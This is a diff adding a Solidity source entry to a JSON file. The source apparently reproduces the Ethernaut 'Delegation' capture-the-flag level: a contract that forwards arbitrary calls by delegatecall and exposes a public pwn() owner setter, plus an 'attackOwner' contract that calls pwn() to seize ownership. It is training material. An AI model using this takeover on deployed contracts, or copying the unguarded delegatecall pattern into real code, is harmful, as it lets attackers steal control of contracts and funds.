@@ -83,5 +83,13 @@
         "file": "token.sol"
       }
     }
+  },
+  "delegate.sol": {
+    "__sources__": {
+      "delegate.sol": {
+        "content": "\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Delegate {\n    address public owner;\n\n    constructor(address _owner) {\n        owner = _owner;\n    }\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract Delegation {\n    address public owner;\n    Delegate delegate;\n\n    constructor(address _delegateAddress) {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n\n    fallback() external {\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n\n\ncontract attackOwner{\naddress owner;\n\naddress contract_attack;\nconstructor(address _ca){\n\ncontract_attack = _ca;\nowner = msg.sender;\n\n}\n\n\nfunction conadd(address _contrac) public{\ncontract_attack = _contrac;\n\n\n}\nfunction getOwenrShip() public {\n\n(bool sus,)= contract_attack.call(abi.encodeWithSignature(\"pwn()\"));\n}\n\n}",
+        "file": "delegate.sol"
+      }
+    }
   }
 }
